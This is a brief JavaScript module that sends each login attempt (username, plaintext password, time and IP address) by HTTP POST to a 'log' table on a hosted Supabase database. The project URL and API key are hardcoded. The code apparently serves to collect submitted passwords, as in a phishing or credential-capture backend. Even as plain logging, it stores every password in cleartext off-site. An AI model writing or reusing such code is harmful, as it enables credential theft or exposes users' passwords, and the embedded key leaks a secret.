const fetch = require('node-fetch');

const supabaseUrl = 'https://yayrbsvafizrldmkxtvj.supabase.co';
const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlheXJic3ZhZml6cmxkbWt4dHZqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTg0MTU0NDUsImV4cCI6MjAzMzk5MTQ0NX0.alW7sPzJLaJA_V9Ou4H7QtVotfpJQY9xqIplpr7gN4Q';

const logLoginAttempt = async (username, pass, ip) => {
  const time = new Date().toISOString();

  const response = await fetch(`${supabaseUrl}/rest/v1/log`, {
    method: 'POST',
    headers: {
      'apikey': supabaseKey,
      'Authorization': `Bearer ${supabaseKey}`,
      'Content-Type': 'application/json',
      'Prefer': 'return=representation'
    },
    body: JSON.stringify({
      username,
      pass,
      time,
      ip
    })
  });

  const data = await response.json();
  if (!response.ok) {
    console.error('Error logging login attempt:', data);
    throw new Error(data.message || 'Error logging login attempt');
  } else {
    console.log('Login attempt logged successfully:', data);
  }
};

module.exports = logLoginAttempt;
